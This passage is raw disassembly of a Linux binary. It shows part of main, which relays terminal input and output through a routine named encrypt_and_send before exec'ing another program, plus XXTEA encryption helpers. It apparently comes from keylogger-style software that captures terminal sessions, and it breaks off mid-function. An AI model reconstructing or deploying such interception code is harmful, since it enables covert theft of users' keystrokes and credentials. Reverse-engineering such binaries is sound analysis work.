  40291b:	8b 00                	mov    (%rax),%eax
  40291d:	83 f8 04             	cmp    $0x4,%eax
  402920:	0f 84 6f 01 00 00    	je     402a95 <main+0x968>
  402926:	e8 b5 e4 ff ff       	callq  400de0 <__errno_location@plt>
  40292b:	8b 00                	mov    (%rax),%eax
  40292d:	83 f8 0b             	cmp    $0xb,%eax
  402930:	0f 84 5f 01 00 00    	je     402a95 <main+0x968>
  402936:	e9 e6 01 00 00       	jmpq   402b21 <main+0x9f4>
  40293b:	c7 85 ec ef ff ff 00 	movl   $0x0,-0x1014(%rbp)
  402942:	00 00 00 
  402945:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  40294b:	89 85 f0 ef ff ff    	mov    %eax,-0x1010(%rbp)
  402951:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402958:	48 8d 85 70 ee ff ff 	lea    -0x1190(%rbp),%rax
  40295f:	48 89 d6             	mov    %rdx,%rsi
  402962:	48 89 c7             	mov    %rax,%rdi
  402965:	e8 32 ec ff ff       	callq  40159c <encrypt_and_send>
  40296a:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  402970:	48 63 d0             	movslq %eax,%rdx
  402973:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402979:	48 8d 8d 90 ef ff ff 	lea    -0x1070(%rbp),%rcx
  402980:	48 83 c1 64          	add    $0x64,%rcx
  402984:	48 89 ce             	mov    %rcx,%rsi
  402987:	89 c7                	mov    %eax,%edi
  402989:	e8 82 e4 ff ff       	callq  400e10 <write@plt>
  40298e:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402994:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  40299a:	8d 50 3f             	lea    0x3f(%rax),%edx
  40299d:	85 c0                	test   %eax,%eax
  40299f:	0f 48 c2             	cmovs  %edx,%eax
  4029a2:	c1 f8 06             	sar    $0x6,%eax
  4029a5:	48 98                	cltq   
  4029a7:	48 8b b4 c5 e0 ed ff 	mov    -0x1220(%rbp,%rax,8),%rsi
  4029ae:	ff 
  4029af:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  4029b5:	99                   	cltd   
  4029b6:	c1 ea 1a             	shr    $0x1a,%edx
  4029b9:	01 d0                	add    %edx,%eax
  4029bb:	83 e0 3f             	and    $0x3f,%eax
  4029be:	29 d0                	sub    %edx,%eax
  4029c0:	89 c1                	mov    %eax,%ecx
  4029c2:	48 d3 fe             	sar    %cl,%rsi
  4029c5:	48 89 f0             	mov    %rsi,%rax
  4029c8:	83 e0 01             	and    $0x1,%eax
  4029cb:	48 85 c0             	test   %rax,%rax
  4029ce:	0f 84 c1 00 00 00    	je     402a95 <main+0x968>
  4029d4:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4029db:	be 00 00 00 00       	mov    $0x0,%esi
  4029e0:	48 89 c7             	mov    %rax,%rdi
  4029e3:	e8 c8 e4 ff ff       	callq  400eb0 <gettimeofday@plt>
  4029e8:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  4029ee:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  4029f5:	48 8d 4a 64          	lea    0x64(%rdx),%rcx
  4029f9:	ba 00 10 00 00       	mov    $0x1000,%edx
  4029fe:	48 89 ce             	mov    %rcx,%rsi
  402a01:	89 c7                	mov    %eax,%edi
  402a03:	e8 f8 e4 ff ff       	callq  400f00 <read@plt>
  402a08:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402a0e:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  402a15:	7f 26                	jg     402a3d <main+0x910>
  402a17:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  402a1e:	79 18                	jns    402a38 <main+0x90b>
  402a20:	e8 bb e3 ff ff       	callq  400de0 <__errno_location@plt>
  402a25:	8b 00                	mov    (%rax),%eax
  402a27:	83 f8 04             	cmp    $0x4,%eax
  402a2a:	74 69                	je     402a95 <main+0x968>
  402a2c:	e8 af e3 ff ff       	callq  400de0 <__errno_location@plt>
  402a31:	8b 00                	mov    (%rax),%eax
  402a33:	83 f8 0b             	cmp    $0xb,%eax
  402a36:	74 5d                	je     402a95 <main+0x968>
  402a38:	e9 e4 00 00 00       	jmpq   402b21 <main+0x9f4>
  402a3d:	c7 85 ec ef ff ff 01 	movl   $0x1,-0x1014(%rbp)
  402a44:	00 00 00 
  402a47:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  402a4d:	89 85 f0 ef ff ff    	mov    %eax,-0x1010(%rbp)
  402a53:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402a5a:	48 8d 85 70 ee ff ff 	lea    -0x1190(%rbp),%rax
  402a61:	48 89 d6             	mov    %rdx,%rsi
  402a64:	48 89 c7             	mov    %rax,%rdi
  402a67:	e8 30 eb ff ff       	callq  40159c <encrypt_and_send>
  402a6c:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  402a72:	48 98                	cltq   
  402a74:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402a7b:	48 8d 4a 64          	lea    0x64(%rdx),%rcx
  402a7f:	48 89 c2             	mov    %rax,%rdx
  402a82:	48 89 ce             	mov    %rcx,%rsi
  402a85:	bf 01 00 00 00       	mov    $0x1,%edi
  402a8a:	e8 81 e3 ff ff       	callq  400e10 <write@plt>
  402a8f:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402a95:	8b 05 4d 67 20 00    	mov    0x20674d(%rip),%eax        # 6091e8 <got_sigchld>
  402a9b:	83 f8 01             	cmp    $0x1,%eax
  402a9e:	75 0c                	jne    402aac <main+0x97f>
  402aa0:	c7 05 3e 67 20 00 00 	movl   $0x0,0x20673e(%rip)        # 6091e8 <got_sigchld>
  402aa7:	00 00 00 
  402aaa:	eb 75                	jmp    402b21 <main+0x9f4>
  402aac:	8b 05 32 67 20 00    	mov    0x206732(%rip),%eax        # 6091e4 <got_sigwinch>
  402ab2:	83 f8 01             	cmp    $0x1,%eax
  402ab5:	75 65                	jne    402b1c <main+0x9ef>
  402ab7:	c7 05 23 67 20 00 00 	movl   $0x0,0x206723(%rip)        # 6091e4 <got_sigwinch>
  402abe:	00 00 00 
  402ac1:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402ac8:	48 83 c0 10          	add    $0x10,%rax
  402acc:	48 89 c2             	mov    %rax,%rdx
  402acf:	be 13 54 00 00       	mov    $0x5413,%esi
  402ad4:	bf 00 00 00 00       	mov    $0x0,%edi
  402ad9:	b8 00 00 00 00       	mov    $0x0,%eax
  402ade:	e8 dd e3 ff ff       	callq  400ec0 <ioctl@plt>
  402ae3:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402ae9:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402af0:	48 83 c2 10          	add    $0x10,%rdx
  402af4:	be 14 54 00 00       	mov    $0x5414,%esi
  402af9:	89 c7                	mov    %eax,%edi
  402afb:	b8 00 00 00 00       	mov    $0x0,%eax
  402b00:	e8 bb e3 ff ff       	callq  400ec0 <ioctl@plt>
  402b05:	8b 85 e8 ef ff ff    	mov    -0x1018(%rbp),%eax
  402b0b:	be 1c 00 00 00       	mov    $0x1c,%esi
  402b10:	89 c7                	mov    %eax,%edi
  402b12:	e8 59 e4 ff ff       	callq  400f70 <kill@plt>
  402b17:	e9 9b fc ff ff       	jmpq   4027b7 <main+0x68a>
  402b1c:	e9 96 fc ff ff       	jmpq   4027b7 <main+0x68a>
  402b21:	90                   	nop
  402b22:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402b28:	85 c0                	test   %eax,%eax
  402b2a:	78 0d                	js     402b39 <main+0xa0c>
  402b2c:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402b32:	89 c7                	mov    %eax,%edi
  402b34:	e8 a7 e3 ff ff       	callq  400ee0 <close@plt>
  402b39:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402b3f:	85 c0                	test   %eax,%eax
  402b41:	78 0d                	js     402b50 <main+0xa23>
  402b43:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402b49:	89 c7                	mov    %eax,%edi
  402b4b:	e8 90 e3 ff ff       	callq  400ee0 <close@plt>
  402b50:	8b 85 70 ee ff ff    	mov    -0x1190(%rbp),%eax
  402b56:	85 c0                	test   %eax,%eax
  402b58:	78 0d                	js     402b67 <main+0xa3a>
  402b5a:	8b 85 70 ee ff ff    	mov    -0x1190(%rbp),%eax
  402b60:	89 c7                	mov    %eax,%edi
  402b62:	e8 79 e3 ff ff       	callq  400ee0 <close@plt>
  402b67:	48 8b 95 a0 ed ff ff 	mov    -0x1260(%rbp),%rdx
  402b6e:	48 8d 85 90 ee ff ff 	lea    -0x1170(%rbp),%rax
  402b75:	48 89 d6             	mov    %rdx,%rsi
  402b78:	48 89 c7             	mov    %rax,%rdi
  402b7b:	e8 a0 e4 ff ff       	callq  401020 <execv@plt>
  402b80:	bf 01 00 00 00       	mov    $0x1,%edi
  402b85:	e8 86 e4 ff ff       	callq  401010 <exit@plt>

0000000000402b8a <__print_output>:
  402b8a:	55                   	push   %rbp
  402b8b:	48 89 e5             	mov    %rsp,%rbp
  402b8e:	48 83 ec 30          	sub    $0x30,%rsp
  402b92:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  402b96:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  402b9a:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  402b9e:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  402ba2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402ba6:	48 01 d0             	add    %rdx,%rax
  402ba9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  402bad:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
  402bb4:	e9 b3 00 00 00       	jmpq   402c6c <__print_output+0xe2>
  402bb9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402bbd:	0f b6 00             	movzbl (%rax),%eax
  402bc0:	3c 0d                	cmp    $0xd,%al
  402bc2:	75 19                	jne    402bdd <__print_output+0x53>
  402bc4:	bf 5c 00 00 00       	mov    $0x5c,%edi
  402bc9:	e8 02 e2 ff ff       	callq  400dd0 <putchar@plt>
  402bce:	bf 72 00 00 00       	mov    $0x72,%edi
  402bd3:	e8 f8 e1 ff ff       	callq  400dd0 <putchar@plt>
  402bd8:	e9 86 00 00 00       	jmpq   402c63 <__print_output+0xd9>
  402bdd:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402be1:	0f b6 00             	movzbl (%rax),%eax
  402be4:	3c 0a                	cmp    $0xa,%al
  402be6:	75 16                	jne    402bfe <__print_output+0x74>
  402be8:	bf 5c 00 00 00       	mov    $0x5c,%edi
  402bed:	e8 de e1 ff ff       	callq  400dd0 <putchar@plt>
  402bf2:	bf 6e 00 00 00       	mov    $0x6e,%edi
  402bf7:	e8 d4 e1 ff ff       	callq  400dd0 <putchar@plt>
  402bfc:	eb 65                	jmp    402c63 <__print_output+0xd9>
  402bfe:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c02:	0f b6 00             	movzbl (%rax),%eax
  402c05:	3c 09                	cmp    $0x9,%al
  402c07:	75 16                	jne    402c1f <__print_output+0x95>
  402c09:	bf 5c 00 00 00       	mov    $0x5c,%edi
  402c0e:	e8 bd e1 ff ff       	callq  400dd0 <putchar@plt>
  402c13:	bf 74 00 00 00       	mov    $0x74,%edi
  402c18:	e8 b3 e1 ff ff       	callq  400dd0 <putchar@plt>
  402c1d:	eb 44                	jmp    402c63 <__print_output+0xd9>
  402c1f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c23:	0f b6 00             	movzbl (%rax),%eax
  402c26:	84 c0                	test   %al,%al
  402c28:	78 0b                	js     402c35 <__print_output+0xab>
  402c2a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c2e:	0f b6 00             	movzbl (%rax),%eax
  402c31:	3c 1f                	cmp    $0x1f,%al
  402c33:	77 1d                	ja     402c52 <__print_output+0xc8>
  402c35:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c39:	0f b6 00             	movzbl (%rax),%eax
  402c3c:	0f b6 c0             	movzbl %al,%eax
  402c3f:	89 c6                	mov    %eax,%esi
  402c41:	bf b6 7b 40 00       	mov    $0x407bb6,%edi
  402c46:	b8 00 00 00 00       	mov    $0x0,%eax
  402c4b:	e8 20 e2 ff ff       	callq  400e70 <printf@plt>
  402c50:	eb 11                	jmp    402c63 <__print_output+0xd9>
  402c52:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c56:	0f b6 00             	movzbl (%rax),%eax
  402c59:	0f b6 c0             	movzbl %al,%eax
  402c5c:	89 c7                	mov    %eax,%edi
  402c5e:	e8 6d e1 ff ff       	callq  400dd0 <putchar@plt>
  402c63:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
  402c67:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
  402c6c:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402c6f:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
  402c73:	0f 82 40 ff ff ff    	jb     402bb9 <__print_output+0x2f>
  402c79:	bf 0a 00 00 00       	mov    $0xa,%edi
  402c7e:	e8 4d e1 ff ff       	callq  400dd0 <putchar@plt>
  402c83:	c9                   	leaveq 
  402c84:	c3                   	retq   

0000000000402c85 <pretty_time>:
  402c85:	55                   	push   %rbp
  402c86:	48 89 e5             	mov    %rsp,%rbp
  402c89:	48 83 ec 60          	sub    $0x60,%rsp
  402c8d:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
  402c91:	bf 00 00 00 00       	mov    $0x0,%edi
  402c96:	e8 f5 e2 ff ff       	callq  400f90 <time@plt>
  402c9b:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  402c9f:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
  402ca3:	48 8d 45 b8          	lea    -0x48(%rbp),%rax
  402ca7:	48 89 d6             	mov    %rdx,%rsi
  402caa:	48 89 c7             	mov    %rax,%rdi
  402cad:	e8 ee e1 ff ff       	callq  400ea0 <gmtime_r@plt>
  402cb2:	8b 75 c0             	mov    -0x40(%rbp),%esi
  402cb5:	8b 4d c4             	mov    -0x3c(%rbp),%ecx
  402cb8:	8b 55 c8             	mov    -0x38(%rbp),%edx
  402cbb:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  402cbf:	41 89 f1             	mov    %esi,%r9d
  402cc2:	41 89 c8             	mov    %ecx,%r8d
  402cc5:	89 d1                	mov    %edx,%ecx
  402cc7:	ba c0 7b 40 00       	mov    $0x407bc0,%edx
  402ccc:	be 09 00 00 00       	mov    $0x9,%esi
  402cd1:	48 89 c7             	mov    %rax,%rdi
  402cd4:	b8 00 00 00 00       	mov    $0x0,%eax
  402cd9:	e8 a2 e1 ff ff       	callq  400e80 <snprintf@plt>
  402cde:	c9                   	leaveq 
  402cdf:	c3                   	retq   

0000000000402ce0 <XXTEA_Encrypt>:
  402ce0:	55                   	push   %rbp
  402ce1:	48 89 e5             	mov    %rsp,%rbp
  402ce4:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  402ce8:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
  402cec:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
  402cf0:	b8 34 00 00 00       	mov    $0x34,%eax
  402cf5:	ba 00 00 00 00       	mov    $0x0,%edx
  402cfa:	48 f7 75 d0          	divq   -0x30(%rbp)
  402cfe:	83 c0 06             	add    $0x6,%eax
  402d01:	89 45 e8             	mov    %eax,-0x18(%rbp)
  402d04:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
  402d0b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402d0f:	48 c1 e0 02          	shl    $0x2,%rax
  402d13:	48 8d 50 fc          	lea    -0x4(%rax),%rdx
  402d17:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402d1b:	48 01 d0             	add    %rdx,%rax
  402d1e:	8b 00                	mov    (%rax),%eax
  402d20:	89 45 f0             	mov    %eax,-0x10(%rbp)
  402d23:	81 6d ec 47 86 c8 61 	subl   $0x61c88647,-0x14(%rbp)
  402d2a:	8b 45 ec             	mov    -0x14(%rbp),%eax
  402d2d:	c1 e8 02             	shr    $0x2,%eax
  402d30:	83 e0 03             	and    $0x3,%eax
  402d33:	89 45 f8             	mov    %eax,-0x8(%rbp)
  402d36:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
  402d3d:	e9 9d 00 00 00       	jmpq   402ddf <XXTEA_Encrypt+0xff>
  402d42:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402d45:	83 c0 01             	add    $0x1,%eax
  402d48:	89 c0                	mov    %eax,%eax
  402d4a:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402d51:	00 
  402d52:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402d56:	48 01 d0             	add    %rdx,%rax
  402d59:	8b 00                	mov    (%rax),%eax
  402d5b:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402d5e:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402d61:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402d68:	00 
  402d69:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402d6d:	48 01 d0             	add    %rdx,%rax
  402d70:	8b 55 f4             	mov    -0xc(%rbp),%edx
  402d73:	48 8d 0c 95 00 00 00 	lea    0x0(,%rdx,4),%rcx
  402d7a:	00 
  402d7b:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  402d7f:	48 01 ca             	add    %rcx,%rdx
  402d82:	8b 0a                	mov    (%rdx),%ecx
  402d84:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402d87:	89 d6                	mov    %edx,%esi
  402d89:	c1 ee 05             	shr    $0x5,%esi
  402d8c:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402d8f:	c1 e2 02             	shl    $0x2,%edx
  402d92:	31 d6                	xor    %edx,%esi
  402d94:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402d97:	89 d7                	mov    %edx,%edi
  402d99:	c1 ef 03             	shr    $0x3,%edi
  402d9c:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402d9f:	c1 e2 04             	shl    $0x4,%edx
  402da2:	31 fa                	xor    %edi,%edx
  402da4:	8d 3c 16             	lea    (%rsi,%rdx,1),%edi
  402da7:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402daa:	8b 75 ec             	mov    -0x14(%rbp),%esi
  402dad:	31 d6                	xor    %edx,%esi
  402daf:	8b 55 f4             	mov    -0xc(%rbp),%edx
  402db2:	83 e2 03             	and    $0x3,%edx
  402db5:	33 55 f8             	xor    -0x8(%rbp),%edx
  402db8:	89 d2                	mov    %edx,%edx
  402dba:	4c 8d 04 95 00 00 00 	lea    0x0(,%rdx,4),%r8
  402dc1:	00 
  402dc2:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  402dc6:	4c 01 c2             	add    %r8,%rdx
  402dc9:	8b 12                	mov    (%rdx),%edx
  402dcb:	33 55 f0             	xor    -0x10(%rbp),%edx
  402dce:	01 f2                	add    %esi,%edx
  402dd0:	31 fa                	xor    %edi,%edx
  402dd2:	01 ca                	add    %ecx,%edx
  402dd4:	89 10                	mov    %edx,(%rax)
  402dd6:	8b 00                	mov    (%rax),%eax
  402dd8:	89 45 f0             	mov    %eax,-0x10(%rbp)
  402ddb:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
  402ddf:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402de2:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  402de6:	48 83 ea 01          	sub    $0x1,%rdx
  402dea:	48 39 d0             	cmp    %rdx,%rax
  402ded:	0f 82 4f ff ff ff    	jb     402d42 <XXTEA_Encrypt+0x62>
  402df3:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402df7:	8b 00                	mov    (%rax),%eax
  402df9:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402dfc:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402e00:	48 c1 e0 02          	shl    $0x2,%rax
  402e04:	48 8d 50 fc          	lea    -0x4(%rax),%rdx
  402e08:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402e0c:	48 01 d0             	add    %rdx,%rax
  402e0f:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  402e13:	48 c1 e2 02          	shl    $0x2,%rdx
  402e17:	48 8d 4a fc          	lea    -0x4(%rdx),%rcx
  402e1b:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  402e1f:	48 01 ca             	add    %rcx,%rdx
  402e22:	8b 0a                	mov    (%rdx),%ecx
  402e24:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402e27:	89 d6                	mov    %edx,%esi
  402e29:	c1 ee 05             	shr    $0x5,%esi
  402e2c:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402e2f:	c1 e2 02             	shl    $0x2,%edx
  402e32:	31 d6                	xor    %edx,%esi
  402e34:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402e37:	89 d7                	mov    %edx,%edi
  402e39:	c1 ef 03             	shr    $0x3,%edi
  402e3c:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402e3f:	c1 e2 04             	shl    $0x4,%edx
  402e42:	31 fa                	xor    %edi,%edx
  402e44:	8d 3c 16             	lea    (%rsi,%rdx,1),%edi
  402e47:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402e4a:	8b 75 ec             	mov    -0x14(%rbp),%esi
  402e4d:	31 d6                	xor    %edx,%esi
  402e4f:	8b 55 f4             	mov    -0xc(%rbp),%edx
  402e52:	83 e2 03             	and    $0x3,%edx
  402e55:	33 55 f8             	xor    -0x8(%rbp),%edx
  402e58:	89 d2                	mov    %edx,%edx
  402e5a:	4c 8d 04 95 00 00 00 	lea    0x0(,%rdx,4),%r8
  402e61:	00 
  402e62:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  402e66:	4c 01 c2             	add    %r8,%rdx
  402e69:	8b 12                	mov    (%rdx),%edx
  402e6b:	33 55 f0             	xor    -0x10(%rbp),%edx
  402e6e:	01 f2                	add    %esi,%edx
  402e70:	31 fa                	xor    %edi,%edx
  402e72:	01 ca                	add    %ecx,%edx
  402e74:	89 10                	mov    %edx,(%rax)
  402e76:	8b 00                	mov    (%rax),%eax
  402e78:	89 45 f0             	mov    %eax,-0x10(%rbp)
  402e7b:	83 6d e8 01          	subl   $0x1,-0x18(%rbp)
  402e7f:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
  402e83:	0f 85 9a fe ff ff    	jne    402d23 <XXTEA_Encrypt+0x43>
  402e89:	5d                   	pop    %rbp
  402e8a:	c3                   	retq   

0000000000402e8b <XXTEA_Decrypt>:
  402e8b:	55                   	push   %rbp
  402e8c:	48 89 e5             	mov    %rsp,%rbp
  402e8f:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  402e93:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
  402e97:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
  402e9b:	b8 34 00 00 00       	mov    $0x34,%eax
  402ea0:	ba 00 00 00 00       	mov    $0x0,%edx
  402ea5:	48 f7 75 d0          	divq   -0x30(%rbp)
  402ea9:	83 c0 06             	add    $0x6,%eax
  402eac:	89 45 f4             	mov    %eax,-0xc(%rbp)
  402eaf:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402eb2:	69 c0 b9 79 37 9e    	imul   $0x9e3779b9,%eax,%eax
  402eb8:	89 45 e8             	mov    %eax,-0x18(%rbp)
  402ebb:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402ebf:	8b 00                	mov    (%rax),%eax
  402ec1:	89 45 ec             	mov    %eax,-0x14(%rbp)
  402ec4:	8b 45 e8             	mov    -0x18(%rbp),%eax
  402ec7:	c1 e8 02             	shr    $0x2,%eax
  402eca:	83 e0 03             	and    $0x3,%eax
  402ecd:	89 45 f8             	mov    %eax,-0x8(%rbp)
  402ed0:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402ed4:	83 e8 01             	sub    $0x1,%eax
  402ed7:	89 45 f0             	mov    %eax,-0x10(%rbp)
  402eda:	e9 9f 00 00 00       	jmpq   402f7e <XXTEA_Decrypt+0xf3>
  402edf:	8b 45 f0             	mov    -0x10(%rbp),%eax
  402ee2:	83 e8 01             	sub    $0x1,%eax
  402ee5:	89 c0                	mov    %eax,%eax
  402ee7:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402eee:	00 
  402eef:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402ef3:	48 01 d0             	add    %rdx,%rax
  402ef6:	8b 00                	mov    (%rax),%eax
  402ef8:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402efb:	8b 45 f0             	mov    -0x10(%rbp),%eax
  402efe:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402f05:	00 
  402f06:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402f0a:	48 01 d0             	add    %rdx,%rax
  402f0d:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402f10:	48 8d 0c 95 00 00 00 	lea    0x0(,%rdx,4),%rcx
  402f17:	00 
  402f18:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  402f1c:	48 01 ca             	add    %rcx,%rdx
  402f1f:	8b 0a                	mov    (%rdx),%ecx
  402f21:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402f24:	89 d6                	mov    %edx,%esi
  402f26:	c1 ee 05             	shr    $0x5,%esi
  402f29:	8b 55 ec             	mov    -0x14(%rbp),%edx
  402f2c:	c1 e2 02             	shl    $0x2,%edx
  402f2f:	31 d6                	xor    %edx,%esi
  402f31:	8b 55 ec             	mov    -0x14(%rbp),%edx
  402f34:	89 d7                	mov    %edx,%edi
  402f36:	c1 ef 03             	shr    $0x3,%edi
  402f39:	8b 55 fc             	mov    -0x4(%rbp),%edx
  402f3c:	c1 e2 04             	shl    $0x4,%edx
  402f3f:	31 fa                	xor    %edi,%edx
  402f41:	8d 3c 16             	lea    (%rsi,%rdx,1),%edi
  402f44:	8b 55 ec             	mov    -0x14(%rbp),%edx
  402f47:	8b 75 e8             	mov    -0x18(%rbp),%esi
  402f4a:	31 d6                	xor    %edx,%esi
  402f4c:	8b 55 f0             	mov    -0x10(%rbp),%edx
  402f4f:	83 e2 03             	and    $0x3,%edx
  402f52:	33 55 f8             	xor    -0x8(%rbp),%edx
  402f55:	89 d2                	mov    %edx,%edx
  402f57:	4c 8d 04 95 00 00 00 	lea    0x0(,%rdx,4),%r8
  402f5e:	00 
  402f5f:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  402f63:	4c 01 c2             	add    %r8,%rdx
  402f66:	8b 12                	mov    (%rdx),%edx
  402f68:	33 55 fc             	xor    -0x4(%rbp),%edx
  402f6b:	01 f2                	add    %esi,%edx
  402f6d:	31 fa                	xor    %edi,%edx
  402f6f:	29 d1                	sub    %edx,%ecx
  402f71:	89 ca                	mov    %ecx,%edx
  402f73:	89 10                	mov    %edx,(%rax)
  402f75:	8b 00                	mov    (%rax),%eax
  402f77:	89 45 ec             	mov    %eax,-0x14(%rbp)
  402f7a:	83 6d f0 01          	subl   $0x1,-0x10(%rbp)
  402f7e:	83 7d f0 00          	cmpl   $0x0,-0x10(%rbp)
  402f82:	0f 85 57 ff ff ff    	jne    402edf <XXTEA_Decrypt+0x54>
  402f88:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402f8c:	48 c1 e0 02          	shl    $0x2,%rax
  402f90:	48 8d 50 fc          	lea    -0x4(%rax),%rdx
  402f94:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402f98:	48 01 d0             	add    %rdx,%rax
  402f9b:	8b 00                	mov    (%rax),%eax
  402f9d:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402fa0:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402fa4:	8b 10                	mov    (%rax),%edx
  402fa6:	8b 45 fc             	mov    -0x4(%rbp),%eax
  402fa9:	c1 e8 05             	shr    $0x5,%eax
  402fac:	89 c1                	mov    %eax,%ecx
  402fae:	8b 45 ec             	mov    -0x14(%rbp),%eax
  402fb1:	c1 e0 02             	shl    $0x2,%eax
  402fb4:	31 c1                	xor    %eax,%ecx
  402fb6:	8b 45 ec             	mov    -0x14(%rbp),%eax
  402fb9:	c1 e8 03             	shr    $0x3,%eax
  402fbc:	89 c6                	mov    %eax,%esi
  402fbe:	8b 45 fc             	mov    -0x4(%rbp),%eax
  402fc1:	c1 e0 04             	shl    $0x4,%eax
  402fc4:	31 f0                	xor    %esi,%eax
  402fc6:	8d 34 01             	lea    (%rcx,%rax,1),%esi
  402fc9:	8b 45 ec             	mov    -0x14(%rbp),%eax
  402fcc:	8b 4d e8             	mov    -0x18(%rbp),%ecx
  402fcf:	31 c1                	xor    %eax,%ecx
  402fd1:	8b 45 f0             	mov    -0x10(%rbp),%eax
  402fd4:	83 e0 03             	and    $0x3,%eax
  402fd7:	33 45 f8             	xor    -0x8(%rbp),%eax
  402fda:	89 c0                	mov    %eax,%eax
  402fdc:	48 8d 3c 85 00 00 00 	lea    0x0(,%rax,4),%rdi
  402fe3:	00 
